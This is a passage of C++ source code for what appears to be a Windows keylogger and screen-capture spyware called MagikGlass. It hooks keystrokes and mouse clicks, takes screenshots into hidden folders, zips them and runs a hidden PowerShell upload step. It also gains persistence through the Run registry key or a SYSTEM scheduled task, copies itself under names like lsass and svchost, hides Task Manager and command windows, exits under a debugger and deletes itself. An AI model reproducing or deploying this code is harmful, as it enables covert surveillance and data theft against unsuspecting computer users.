	Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
	Command += Powershell;
	Command += "\"";
	ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
}

ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer

    char* AppData = nullptr;
    DWORD Size = MAX_LENGTH + 1;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
    std::string CurrentLog;
    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
    std::string ScreenshotDir = AppData;
    ScreenshotDir += "\\MagikGlass";
    //ScreenshotDir += std::to_string(rand() % 10000+1000);
    DWORD DWFlags;

    while (1) {
		std::this_thread::sleep_for(std::chrono::seconds(3));
        DeleteDirectory(ScreenshotDir);
        std::this_thread::sleep_for(std::chrono::seconds(3));
        CreateDirectoryA(ScreenshotDir.c_str(), NULL);
        SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
        
		if (ScreenshotMode == 1) {
            for (int i = 0; i < ScreenshotsPerZip; i++) {
                CurrentLog = ScreenshotDir;
                CurrentLog += "\\ScreenShot";
                CurrentLog += std::to_string(rand() % 10000 + 1000);
                CurrentLog += ".png";

                TakeScreenShot(CurrentLog.c_str());

                Sleep(ScreenshotDelay * 1000);
            }
        }else if(ScreenshotMode == 2){
            std::thread t2(Hooker,WH_MOUSE_LL,MouseThread);
            while (!mutex2) {
                std::this_thread::sleep_for(std::chrono::seconds(3));
            }
            t2.join();
        }
        std::string ZipPath = ScreenshotDir;
        ZipPath += "\\Zip";
        ZipPath += std::to_string(rand() % 10000+1000);
        ZipPath += ".zip";

        FILE* f = fopen(ZipPath.c_str(), "wb");
        fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
        fclose(f);

        const char* files[] = {
            ScreenshotDir.c_str()
        };
	    {
            CoInitialize(NULL);
            CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
            CoUninitialize();
        }

        if (!InternetGetConnectedState(&DWFlags, NULL)) {
            //SetUploadTask(Emailer, ZipPath);
        }
        else {

			(CalculateDirSize(CurrentLog) > ScreenshotsPerZip);
			std::string ZipPath1 = ZipPath;
			RunPS1File(ZipPath1); //takes approx 45 seconds for this to action. 
			std::this_thread::sleep_for(std::chrono::seconds(35));

        }

        Counter2 = 0;
        mutex2 = !mutex2;
        std::this_thread::sleep_for(std::chrono::minutes(1));
		DeleteDirectory(ZipPath); //double check it deletes so there is no extra images in next zip file
    }
}

int CalculateDirSize(std::string DirectoryToCheck) {

    HANDLE hFind;
    WIN32_FIND_DATAA data;

    DirectoryToCheck += "\\*.*";

    int FileCounter = 0;

    //char FilePath[MAX_PATH + 1];
    DWORD FileSize = MAX_PATH + 1;

    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
            FileCounter++;
            //}
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }

    return FileCounter;
}


void CreateRegistryKey(PCSTR AppName, PCSTR PathToExe)
{
    HKEY hKey = NULL;
    char szValue[MAX_PATH] = {};
    std::string Cmd;
    strcpy_s(szValue, "\"");
    strcat_s(szValue, PathToExe);
    strcat_s(szValue, "\" ");
    if (IsElevated()) {
        Cmd = "/delete  /tn \"";
        Cmd += AppName;
        Cmd += "\" /f";
        ShellExecuteA(NULL, "open", "schtasks.exe", Cmd.c_str(), NULL, SW_HIDE);
        Cmd = "/create /sc onlogon /tn \"";
        Cmd += AppName;
        Cmd += "\" /tr ";
        Cmd += szValue;
        Cmd += " /ru \"SYSTEM\"";
        ShellExecuteA(NULL, "open", "schtasks.exe", Cmd.c_str(), NULL, SW_HIDE);
    }
    else {
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
        RegSetValueExA(hKey, AppName, 0, REG_SZ, (BYTE*)szValue, strlen(szValue) + 1);
        RegCloseKey(hKey);
    }
    return;
}

ULONG WINAPI Protect(LPVOID Parameter) {

    if (IsDebuggerPresent()) {
        exit(0);
    }
    while (1) {

        HWND Prog;
        Prog = FindWindowA(NULL, "Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Windows Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Command Prompt");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Run");
        ShowWindow(Prog, 0);
        Sleep(200);
    }
    return 0;
}

std::string GetCpuInfo()
{
    std::array<int, 4> integerBuffer = {};
    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();
    std::array<char, 64> charBuffer = {};
    constexpr std::array<int, 3> functionIds = {
        0x8000'0002,
        0x8000'0003,
        0x8000'0004
    };
    std::string cpu;
    for (int id : functionIds)
    {
        __cpuid(integerBuffer.data(), id);                                          //since its x64 use __cpuid instead of inline asm
        std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);
        cpu += std::string(charBuffer.data());
    }
    return cpu;
}

BOOL fexists(std::string filename) {
    DWORD dwAttrib = GetFileAttributes(filename.c_str());

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void FinalExit() {
    char PathToSelf[MAX_PATH];
    GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
    std::string Command = "/C timeout 3 /nobreak > Nul & Del /f /q \"";
    Command += PathToSelf;
    Command += "\"";
    ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
    exit(0);
}

std::string HardDecode(std::string EncodedString) {
    std::string Buf;
    for (int i = EncodedString.size() - 1; i >= 0; i--) {Buf += EncodedString[i] -1;}
    Base64::decode(Buf, &EncodedString);
    return EncodedString;
}

LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;
    KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)lParam;
    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:
            if (Counter >= CharactersPerLog) {
                mutex = true;
                ExitThread(0);
            }
            if(LogMode == 2){
                Counter++;
            }
            MyLog.LogItInt(keyboard->vkCode);

            break;
        case WM_SYSKEYDOWN:
            break;
        case WM_KEYUP:
            break;
        case WM_SYSKEYUP:
            break;
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int Hooker(int HookType, HOOKPROC CallbackFunc)
{
    // Install the low-level keyboard & mouse hooks
    HHOOK hhkLowLevelKybd = SetWindowsHookExA(HookType, CallbackFunc, 0, 0);

    // Keep this app running until we're told to stop
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhkLowLevelKybd);            //unhook regardless of mutex state if the thread is forced to close

    return(0);
}

LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {

    MSLLHOOKSTRUCT* Mouse = (MSLLHOOKSTRUCT*)lParam;
    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
        if (Counter2 >= ScreenshotsPerZip) {
            mutex2 = true;
            ExitThread(0);                                      //kill the entire thread when done
        }
        char* AppData = nullptr;
        DWORD Size = MAX_LENGTH + 1;
        size_t AppDataSize;
        _dupenv_s(&AppData, &AppDataSize, "APPDATA");
        std::string ScreenshotName = AppData;
        ScreenshotName += "\\MagikGlass\\SC_";
        if(wParam == WM_LBUTTONDOWN)
            ScreenshotName += "LCLICK_";
        if(wParam == WM_RBUTTONDOWN)
            ScreenshotName += "RCLICK_";
        ScreenshotName += "x";
        ScreenshotName += std::to_string(Mouse->pt.x);
        ScreenshotName += "y";
        ScreenshotName += std::to_string(Mouse->pt.y);
        ScreenshotName += "_";
        ScreenshotName += std::to_string(GetTickCount());
        ScreenshotName += ".png";
        TakeScreenShot(ScreenshotName.c_str());
        Counter2++;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void TimerThread() {
    std::this_thread::sleep_for(std::chrono::minutes(LogTimer));
    if(LogMode == 1){
        Counter = CharactersPerLog;
    }
    ExitThread(0);
}

std::string RetrieveExternalIp(std::string CurrentDir) {
    std::string Ret;
    std::string VersionFile = CurrentDir;
    VersionFile += "\\ExtIP.txt";
    URLDownloadToFileA(NULL, "https://api.my-ip.io/ip.txt" , VersionFile.c_str(), 0, NULL);
    SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
    std::ifstream VersionFileIO(VersionFile);
    if (!VersionFileIO.eof()) {
        std::getline(VersionFileIO, Ret, '\0');
    }
    VersionFileIO.close();
    DeleteFileA(VersionFile.c_str());
    return Ret;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

std::string QueryWMI(bstr_t Table, const wchar_t* Item, int Type) {

    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
    );
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
        NULL,                    // User name. NULL = current user
        NULL,                    // User password. NULL = current
        0,                       // Locale. NULL indicates current
        NULL,                    // Security flags.
        0,                       // Authority (for example, Kerberos)
        0,                       // Context object 
        &pSvc                    // pointer to IWbemServices proxy
    );
    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
        NULL,                        // Server principal name 
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // client identity
        EOAC_NONE                    // proxy capabilities 
    );
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(
        bstr_t("WQL"),
        Table,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator);
    IWbemClassObject* pclsObj = NULL;
    ULONG uReturn = 0;
    std::string Ret = {};
    while (pEnumerator)
    {
        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
            &pclsObj, &uReturn);

        if (0 == uReturn)
        {
            break;
        }

        VARIANT vtProp;
        VariantInit(&vtProp);
        hr = pclsObj->Get(Item, 0, &vtProp, 0, 0);
        VariantClear(&vtProp);
		switch (Type) {
		case 1:
			Ret = _com_util::ConvertBSTRToString(vtProp.bstrVal);
			break;
		case 2:
			Ret = std::to_string(vtProp.uintVal);
			break;
		default:
			break;
		}
        pclsObj->Release();
    }

    pSvc->Release();
    pLoc->Release();
    pEnumerator->Release();
    CoUninitialize();

    return Ret;
}

void FirstSetup() {
    std::string CopiedFileText = "Made executable \"";
    char PathToFile[MAX_PATH]; DWORD Size;
    std::string UserNameT = QueryWMI("SELECT * FROM Win32_ComputerSystem", L"Username", 1);
    std::string::size_type pos = std::string(UserNameT).find_last_of("\\/");
    std::string UserName = std::string(UserNameT).substr(pos+1, UserNameT.size());
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    std::string DestinationFile = "C:\\Users\\";
    DestinationFile += UserName;
    DestinationFile += "\\Music\\MagikIndex";
    CreateDirectoryA(DestinationFile.c_str(), NULL);
    SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);

    if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
        DeleteDirectory(DestinationFile);
        MyLog.LogItChar("Cleaned MagikIndex folder...");
        Sleep(200);

		CreateDirectoryA(DestinationFile.c_str(), NULL);
		SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN); //added incase delete occurred
    }
    DestinationFile += "\\";
    std::string CopiedFile;
	std::string CharacterSet[11] =
	{ "crss","wininit","lsass","smss","dwm","rundll32","taskmgr","svchost","explorer","avast" };
	for (int i = 0; i < 1; i++) {
		CopiedFile += CharacterSet[rand() % 10 + 0];
	}
    DestinationFile += CopiedFile;
    DestinationFile += ".exe";
    CopyFileA(PathToFile, DestinationFile.c_str(), false);
    CopiedFileText += CopiedFile;
    CopiedFileText += ".exe\"...";
    MyLog.LogItChar(CopiedFileText);
    CreateRegistryKey("MagikIndex", DestinationFile.c_str());
    MyLog.LogItChar("Registered executable for startup...");
}


#pragma warning( pop )
